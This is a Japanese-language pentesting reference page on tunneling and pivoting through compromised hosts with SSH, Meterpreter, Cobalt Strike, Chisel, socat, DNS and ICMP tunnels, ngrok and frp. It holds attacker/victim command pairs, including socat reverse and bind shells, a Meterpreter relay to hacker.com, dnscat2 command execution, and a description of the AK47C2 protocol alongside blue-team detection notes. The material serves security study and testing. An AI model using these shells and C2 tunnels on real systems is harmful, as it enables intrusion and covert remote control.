# Tunneling and Port Forwarding

{{#include ../banners/hacktricks-training.md}}

## Nmapのヒント

> [!WARNING]
> NmapのproxyサポートはTCP接続に限定されており、ping、port、OS検出スキャンには影響しません。scannerがSOCKS proxyの背後にある場合は、**ホスト検出を無効化**（`-Pn`）し、**TCP connect scan**（`-sT`）を使用してください。<sup>[[5]](#references)</sup>

## **Bash**

**Host -> Jump -> InternalA -> InternalB**

最後のコマンドでは、Evil-WinRMの`-u`および`-i`オプションを使用してアカウントとWinRMホストを指定します。WinRMのデフォルトportは5985です。<sup>[[4]](#references)</sup>
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

OpenSSH は、暗号化された channel 経由で X11 接続、任意の TCP port、Unix domain socket を forward できます。<sup>[[6]](#references)</sup>

SSH graphical connection (X)

`-Y` は trusted X11 forwarding を有効にし、`-C` は forwarded data の compression を要求します。<sup>[[6]](#references)</sup>
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Remote Port2Port

SSH Server で新しい Port を開く --> Other port

Remote（`-R`）forwarding は SSH server で listen し、local 側に接続します。明示的な bind address によって、その listener にアクセスできる interface が制御されます。<sup>[[6]](#references)</sup>
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

ローカルポート --> Compromised host (SSH) --> Third_box:Port

ローカル（`-L`）forwardingはクライアントでリッスンし、SSH server側から宛先に接続します。<sup>[[6]](#references)</sup>
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

ローカルポート --> Compromised host (SSH) --> どこへでも

Dynamic (`-D`) forwarding は、リモート側から接続を開くローカル SOCKS4/SOCKS5 listener を作成します。<sup>[[6]](#references)</sup>
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Reverse Port Forwarding

これは、DMZを経由してホストから内部ホストへのreverse shellsを取得する場合に有用です。

サーバーの`GatewayPorts`設定は、remote forwardがloopbackの外側にbindできるかどうかを制御します。デフォルトは`no`です。<sup>[[7]](#references)</sup>
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

この root ベースの例では、両方のホスト上にトンネルデバイスを作成します。サーバーでは tun forwarding を許可し、選択したアカウントに tun デバイスへのアクセス権を付与する必要があります。ここでは `PermitRootLogin yes` によって `root` アカウントを使用できます。<sup>[[6]](#references)[[7]](#references)</sup>\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```
サーバー側でフォワーディングを有効にする
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
クライアント側で新しいルートを設定する
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **Security – Terrapin Attack (CVE-2023-48795)**
> OpenSSH 9.6 では、Terrapin の初期 transport integrity attack に対抗するため、strict-KEX extension が追加されました。可能な場合は両方の peer を更新し、古い実装については、forwarded channel がバージョンだけで保護されていると想定せず、vendor のガイダンスに従ってください。<sup>[[8]](#references)</sup>

## SSHUTTLE

**ssh** 経由で、ホストを通してサブネットワークへのすべての **traffic** を **tunnel** できます。\
たとえば、10.10.10.0/24 宛てのすべての traffic を forward します。

`sshuttle` は SSH 上で透過的な proxying を提供し、以下のようにサブネットとカスタム SSH command を選択できます。<sup>[[9]](#references)</sup>
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
秘密鍵で接続する
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

Metasploit の `portfwd` はローカル forwarding とリモート forwarding をサポートします。一方、SOCKS proxy module は session routes または `autoroute` と連携して動作することを想定しており、これらの例ではデフォルトで port 1080 を listen します。<sup>[[10]](#references)[[11]](#references)[[12]](#references)</sup>

### Port2Port

ローカル port --> Compromised host (active session) --> Third_box:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
別の方法:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

Cobalt StrikeのBeaconは、Beacon経由でSOCKS4a/SOCKS5接続を中継できます。`rportfwd`は侵害されたホスト上でbindし、`rportfwd_local`はCobalt Strikeクライアントから宛先への接続を開始します。<sup>[[13]](#references)[[14]](#references)</sup>

### SOCKS proxy

Beacon経由でトラフィックをルーティングするインターフェース上のTeam Serverでポートを開きます。<sup>[[13]](#references)</sup>
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> この場合、**port は Beacon host で開かれ**、トラフィックは Team Server に送信され、そこから指定された host:port に送信されます。<sup>[[14]](#references)</sup>
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
Reverse-forwarding manual には、次の動作が記載されています。<sup>[[14]](#references)</sup>

- Beacon の reverse port forward は、**個々のマシン間でリレーするためではなく、Team Server へトラフィックをトンネルするように設計されています**。
- トラフィックは、P2P リンクを含む **Beacon の C2 トラフィック内でトンネルされます**。
- high ports は通常、privileged port の制限を回避しますが、対象 OS のポリシーと既存の listener の影響は受けます。

### rPort2Port local

> [!WARNING]
> この場合、**port は Team Server ではなく Beacon host 上で開かれ**、**トラフィックは Team Server ではなく Cobalt Strike client に送信され**、そこから指定された host:port に送られます。<sup>[[14]](#references)</sup>
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

この project は `tunnel.aspx`、`tunnel.ashx`、`tunnel.jsp`、`tunnel.php` などの web tunnel endpoint を提供します。local proxy を開始する前に、対応している endpoint を 1 つ upload してください。<sup>[[15]](#references)</sup>
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) の releases page からダウンロードできます\
Chisel は SSH で保護された接続を使用して HTTP 経由で TCP/UDP トラフィックを転送します。互換性のある client/server build を使用し、選択した release の command syntax を確認してください。<sup>[[16]](#references)</sup>

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Port forwarding
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

Ligolo-ng の quickstart では、proxy 上の TUN interface、agent に対する certificate-fingerprint validation、および tunneled network 用の route setup について説明しています。<sup>[[17]](#references)</sup>

### Tunneling
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Agent のバインドとリスニング

Ligolo-ng は、proxy 側のアドレスに転送する listener を agent 上に追加でき、予約済みの `240.0.0.0/4` 範囲をルーティングして agent ローカルのサービスに到達できます。<sup>[[18]](#references)[[19]](#references)</sup>
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### エージェントのローカルポートへのアクセス
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Rpivotは被害者側からreverse tunnelを開始し、攻撃者のloopback address上にSOCKS4 proxyを公開します。READMEには、NTLM-proxyの認証情報およびhash optionsについても記載されています。<sup>[[20]](#references)</sup>
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
**NTLM proxy** 経由の Pivot
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

Socat は `TCP-LISTEN`、`EXEC`、`SOCKS4A`、`OPENSSL`、`PROXY` などの address type を組み合わせます。以下の例では、これらのドキュメント化された endpoint を組み合わせています。<sup>[[21]](#references)</sup>

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### socks経由のPort2Port
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### SSL Socat 経由の Meterpreter
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
socat の documented `PROXY` address type を使用して、victim の console で最後の行の代わりに次の行を実行することで、**認証なしの proxy** を経由できます。<sup>[[21]](#references)</sup>
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tunnel

**/bin/sh console**

Client と Server の両方で証明書を作成します
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

ローカルのSSHポート（22）を攻撃者ホストの443ポートに接続します
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

PlinkはPuTTYのコマンドライン接続ツールであり、`ssh`と同様のSSH forwardingオプションを備えています。<sup>[[22]](#references)</sup>

SSHのportには大文字の`-P`を使用します。`-pw`は互換性のために維持されていますが、process listにpasswordが表示されるため、可能な場合はkey authenticationまたは`-pwfile`を優先してください。<sup>[[22]](#references)[[23]](#references)</sup>

このbinaryはvictim上で実行され、SSH clientであるため、reverse connection用にSSH serviceとportを開いてください。以下では`-R`を使用して、locally accessibleなportをattackerのmachineにforwardします。<sup>[[22]](#references)</sup>
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-P <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-P 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

永続的な `portproxy` ルールを作成または変更する際は、ホストが必要とする権限を持つコンテキストを使用してください。Microsoft は、以下で使用する `v4tov4` の追加、表示、削除形式をドキュメント化しています。<sup>[[24]](#references)</sup>
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

**システムへの RDP access が必要です**。\
Download:

SocksOverRDP は Remote Desktop Dynamic Virtual Channels を使用して、既存の RDP session 経由で SOCKS5 connection を転送します。client plugin は `127.0.0.1:1080` で待ち受け、server component は RDP target 上で実行されます。<sup>[[25]](#references)</sup>

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - この tool は Windows の Remote Desktop Service feature に含まれる `Dynamic Virtual Channels` (`DVC`) を使用します。DVC は **RDP connection 経由で packet を tunneling する役割**を担います。
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

client computer で **`SocksOverRDP-Plugin.dll`** を次のように load します：
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
これで、**`mstsc.exe`** を使用して **RDP** 経由で **victim** に **connect** でき、**SocksOverRDP plugin が有効**であることを示す **prompt** が表示され、**127.0.0.1:1080** で **listen** するはずです。

**RDP** 経由で **connect** し、`SocksOverRDP-Server.exe` バイナリを victim machine に upload して execute します：
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
ここで、マシン（attacker）上でポート1080がリッスンしていることを確認します:
```
netstat -antb | findstr 1080
```
これで [**Proxifier**](https://www.proxifier.com/) を使用して、そのポート経由でトラフィックを proxy できます。<sup>[[26]](#references)</sup>

## Proxify Windows GUI Apps

[**Proxifier**](https://www.proxifier.com/) を使用すると、Windows GUI apps の通信を proxy 経由にできます。<sup>[[26]](#references)</sup>\
**Profile -> Proxy Servers** で、SOCKS server の IP とポートを追加します。\
**Profile -> Proxification Rules** で、proxify するプログラムの名前と、proxify する対象 IP への接続を追加します。Proxifier rules では、applications、target hosts、ports を条件に指定できます。<sup>[[27]](#references)</sup>

## NTLM proxy 経由で Tunnel する

前述の tool である **Rpivot** は、NTLM-authenticating proxy 経由で relay できます。**OpenVPN** も、auth file と NTLMv2 method を使用するよう設定すれば、そのような proxy 経由で routing できます。これは proxy traversal であり、proxy authentication の bypass ではありません。<sup>[[20]](#references)[[28]](#references)</sup>
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm2
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Cntlmは上流のNTLM proxiesに対して認証を行い、local listenersを公開し、local tunnel portをdestination serviceにマッピングできます。これにより、clientsはそのlocal portを使用できます。<sup>[[29]](#references)</sup>\
たとえば、port 443をforwardします
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
ここで、例えば被害者側の **SSH** service が port 443 で listen するように設定すると、attacker 側の port 2222 を介して接続できます。<sup>[[29]](#references)</sup>\
attacker が port 2222 で listen している間、localhost:443 に接続する **meterpreter** を使用することもできます。<sup>[[29]](#references)</sup>

## YARP

YARP (Yet Another Reverse Proxy) は、Microsoft の .NET reverse-proxy toolkit です。こちらにあります: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)。<sup>[[30]](#references)</sup>

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Iodine は DNS queries を介して IPv4 tunnel を作成し、TUN interfaces を使用します。文書化されている setup では、両端でそれらの interfaces を作成するために必要な privileges が必要です。<sup>[[31]](#references)</sup>
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
DNS transport は direct TCP より overhead が大きく、通常は低速です。この tunnel を通じて compressed SSH connection を作成するには、次を使用できます。<sup>[[31]](#references)</sup>
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**ここからダウンロード**](https://github.com/iagox86/dnscat2)**。**

Dnscat2 は DNS を介して暗号化された command-and-control channel を確立します。以下の server および client コマンドは、文書化された使用方法に従っています。<sup>[[32]](#references)</sup>
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **PowerShellで**

[**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell)を使用すると、PowerShellでdnscat2 clientを実行できます。READMEには、以下に示す`Start-Dnscat2`のparametersが記載されています。<sup>[[33]](#references)</sup>
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **dnscatによるPort forwarding**

Dnscat2のinteractiveな`listen` commandは、local listenerをremote hostおよびportにマッピングします。<sup>[[32]](#references)</sup>
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Change proxychains DNS

Proxychains-ng は動的にリンクされた TCP 接続をフックしますが、UDP や ICMP を運ぶことはできません。DNS proxying は設定可能なため、固定の public resolver を想定せず、インストール済みの `proxychains.conf` と resolver helper を確認してください。Legacy の `proxyresolv` scripts では、resolver を選択するために `PROXY_DNS_SERVER` が公開されています。内部名が必要な場合は、pivot から到達可能な resolver を使用してください。<sup>[[34]](#references)[[35]](#references)</sup>

## Tunnels in Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Custom DNS TXT / HTTP JSON C2 (AK47C2)

Storm-2603 actor は、企業ネットワークでブロックされることが少ない 2 つの protocol、つまり outbound **DNS** と **plain HTTP POST** のみを悪用する **dual-channel C2 ("AK47C2")** を作成しました。<sup>[[2]](#references)</sup>

1. **DNS mode (AK47DNS)**
• ランダムな 5 文字の SessionID（例: `H4T14`）を生成します。
• *task requests* には `1`、*results* には `2` を先頭に付け、異なる fields（flags、SessionID、computer name）を連結します。
• 各 field は ASCII key `VHBD@H` で **XOR-encrypted** され、hex-encoded された後、dots で連結されます。最後に attacker-controlled domain が続きます。

```text
<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
```

• Requests は `DnsQuery()` を使用して **TXT**（および fallback として **MG**）records を取得します。
• Response が 0xFF bytes を超える場合、backdoor は data を 63-byte pieces に **fragments** し、markers:
`s<SessionID>t<TOTAL>p<POS>` を挿入して、C2 server が並べ替えられるようにします。

2. **HTTP mode (AK47HTTP)**
• JSON envelope を構築します。
```json
{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
```
• blob 全体を XOR-`VHBD@H` → hex → `Content-Type: text/plain` header を付けた **`POST /`** の body として送信します。
• Reply も同じ encoding に従い、`cmd` field は `cmd.exe /c <command> 2>&1` で実行されます。

Blue Team notes
• first label が長い hexadecimal で、常に 1 つの rare domain で終わる、異常な **TXT queries** を探します。
• constant XOR key と ASCII-hex の組み合わせは YARA で容易に検出できます: `6?56484244?484`（`VHBD@H` の hex）。
• HTTP では、pure hex で 2 bytes の倍数になっている text/plain POST bodies を flag します。

{{#note}}
この channel は各 sub-domain label を 63-octet の DNS limit 内に保ちますが、protocol compliance だけでは stealthy にはなりません。rare domains、長い hexadecimal labels、query volume は引き続き detection signals です。<sup>[[2]](#references)[[36]](#references)</sup>
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Hans は、TUN device と ICMP echo requests を使用する IPv4-over-ICMP tunnel について説明しています。setup には interface を作成するのに十分な privileges が必要です。<sup>[[37]](#references)</sup>
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**ここからダウンロード**](https://github.com/utoni/ptunnel-ng.git)。

ptunnel-ng は TCP 接続を ICMP 経由で転送し、以下に示す `-p`、`-l`、`-r`、`-R` オプションを、それぞれプロキシ、ローカルリスナー、宛先ホスト、宛先ポートに使用します。<sup>[[38]](#references)</sup>
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) は、安全なトンネルを通じてローカルネットワークサービスをオンラインで公開するためのエージェントです。CLI では HTTP、TCP、file URL エンドポイントがドキュメント化されており、表示されるエンドポイントのホスト名はエンドポイントやアカウントによって異なる場合があります。<sup>[[39]](#references)</sup>

### インストール

- アカウントを作成: https://ngrok.com/signup
- Client のダウンロード:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### 基本的な使用方法

**ドキュメント:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_必要に応じて、agent は認証および TLS オプションにも対応しています。<sup>[[39]](#references)</sup>_

#### TCP のトンネリング
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### HTTPによるファイル公開
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### HTTP calls の sniffing

_XSS、SSRF、SSTI などに有用_\
standalone agent はデフォルトで `http://127.0.0.1:4040` に HTTP inspection interface を公開します。この interface は HTTP traffic 用です。<sup>[[40]](#references)</sup>

#### internal HTTP service の tunneling

`--host-header=rewrite` オプションは、upstream HTTP の `Host` header を local service に一致するよう書き換えます。<sup>[[41]](#references)</sup>
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ngrok.yaml シンプル設定例

これは ngrok Agent Config v2 を使用します。名前付き tunnel は `proto` と `addr` を使用し、`ngrok start` で起動します。<sup>[[42]](#references)</sup> 3 つの tunnel を開きます。

- 2 つの TCP
- /tmp/httpbin/ から静的ファイルを公開する 1 つの HTTP
```yaml
version: 2
tunnels:
mytcp:
addr: 4444
proto: tcp
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared (Cloudflare Tunnel)

Cloudflare Tunnel の `cloudflared` connector は outbound connection を確立します。公開された application では HTTP、HTTPS、TCP、SSH、RDP を route できます。一方、quick tunnel は HTTP development 用です。<sup>[[43]](#references)[[45]](#references)</sup>

### Quick tunnel ワンライナー
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### SOCKS5 origin（legacy mode）

legacy の `--socks5` flag は、local origin が SOCKS5 を使用することを `cloudflared` に伝えます。local SOCKS5 listener は作成しません。managed tunnel では、`originRequest.proxyType: socks` によって SOCKS5 origin の処理を設定します。<sup>[[44]](#references)</sup>
```bash
# Expose a local SOCKS5-speaking origin (legacy syntax)
cloudflared tunnel --url socks5://localhost:1080 --socks5
```
### DNSを使用した永続的なトンネル

ローカルで管理するトンネル設定では、以下に示すように、小文字の `tunnel`、`credentials-file`、`url` キーを使用します。<sup>[[46]](#references)</sup>
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
コネクタを起動：
```bash
cloudflared tunnel run mytunnel
```
Connectorは outbound connectionsを確立し、デフォルトではHTTP/2へのfallback付きでQUICをネゴシエートします。すべてのdeploymentがTCP/443を使用すると仮定しないでください。deploymentに必要な権限のみで実行してください。<sup>[[43]](#references)[[47]](#references)</sup>

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp)は、**TCP、UDP、HTTP/S、STCP/SUDP、TCPMUX、XTCP**をサポートするGo製のreverse proxyです。XTCPは、成功するかどうかがNATに依存するP2P hole punchingを使用します。**v0.53.0**以降は**SSH Tunnel Gateway**として動作できるため、target hostは`frpc` binaryなしで標準のOpenSSH clientを使用できます。<sup>[[48]](#references)[[49]](#references)[[50]](#references)</sup>

### 従来のreverse TCP tunnel
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### 新しい SSH gateway を使用（frpc binary なし）
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
上記のコマンドは、`frps` がゲートウェイを提供する中、標準の OpenSSH client を使用して victim の port **8080** を **attacker_ip:9000** として公開します。<sup>[[50]](#references)</sup>

## QEMUベースの covert VM Tunnels

